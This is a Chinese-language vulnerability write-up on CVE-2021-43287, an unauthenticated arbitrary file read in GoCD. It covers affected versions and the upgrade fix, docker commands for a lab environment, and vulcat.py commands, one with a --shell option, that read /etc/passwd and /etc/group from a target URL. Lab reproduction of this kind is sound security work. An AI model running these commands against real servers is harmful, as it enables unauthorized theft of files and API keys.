# 🧡 GoCD Business Continuity 任意文件读取

### 1）漏洞信息

|漏洞名称	|受影响组件	|漏洞类型	|漏洞编号	|
|--	|--	|--	|--	|
|GoCD Business Continuity任意文件读取	|[GoCD](https://github.com/gocd/gocd)	|任意文件读取	|CVE-2021-43287	|

|漏洞简介	|
|--	|
|<p>​GoCD Business Continuity 存在任意文件读取漏洞，未经身份验证的攻击者可以利用该漏洞来接管 CI/CD 管道，最终可在未授权的情况下造成任意文件读取，获取敏感API密钥等信息。</p><p>影响版本：</p>20.6.0 <= GoCD <= 21.2.0	|

|参考链接	|
|--	|
|<ol><li><a href="https://avd.aliyun.com/detail?id=AVD-2021-43287">https://avd.aliyun.com/detail?id=AVD-2021-43287</a></li><li><a href="http://wiki.peiqi.tech/wiki/webserver/GoCD/GoCD%20plugin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-43287.html">http://wiki.peiqi.tech/wiki/webserver/GoCD/GoCD%20plugin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-43287.html</a></li></ol>	|

|补丁及修复方案	|
|--	|
|升级该组件至最新版本：<ol><li><a href="https://github.com/gocd/gocd">https://github.com/gocd/gocd</a></li><li><a href="https://www.gocd.org/">https://www.gocd.org/</a></li></ol>	|

### 漏洞环境

#### 方案一
使用[官方镜像](https://hub.docker.com/layers/gocd/gocd-server/v21.1.0/images/sha256-7d68a41ac2656d1ccf3e8426df7be0df7b92b4a5e49d28486642200fc6604c86?context=explore)搭建漏洞环境

```
docker pull gocd/gocd-server:v21.1.0
docker run -itd -p 8153:8153 gocd/gocd-server:v21.1.0
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/01.png" alt=""><figcaption></figcaption></figure>

启动容器后，访问8153端口即可看到gocd的页面
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/02.png" alt=""><figcaption></figcaption></figure>


#### 方案二
使用[vulfocus镜像](https://github.com/fofapro/vulfocus)搭建漏洞环境

```
docker pull vulfocus/gocd-cve_2021_43287
docker run -itd -p 8153:8153 vulfocus/gocd-cve_2021_43287
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/07.png" alt=""><figcaption></figcaption></figure>

启动容器后，如果看到以下页面，则稍等一会
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/08.png" alt=""><figcaption></figcaption></figure>

稍等一会之后，即可看到gocd页面
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/10.png" alt=""><figcaption></figcaption></figure>


### 漏洞复现

```
python3 vulcat.py -u <URL> -a gocd -v cve-2021-43287

# 注意, vulcat-v2.0.0版本及以上, 应使用以下命令
python3 vulcat.py -u <URL> -v cve-2021-43287
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/03.png" alt=""><figcaption></figcaption></figure>

直接访问Target即可读取/etc/passwd文件
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/04.png" alt=""><figcaption></figcaption></figure>

你也可以使用Request数据包
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/05.png" alt=""><figcaption></figcaption></figure>

/etc/group
<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/06.png" alt=""><figcaption></figcaption></figure>

#### 支持--shell选项

```
python3 vulcat.py -u <URL> -a gocd -v cve-2021-43287 --shell

# 注意, vulcat-v2.0.0版本及以上, -a选项被移除, 应使用以下命令
python3 vulcat.py -u <URL> -v cve-2021-43287 --shell
```

<figure><img src="https://cdn.staticaly.com/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/gocd/cve-2021-43287/12.png" alt=""><figcaption></figcaption></figure>
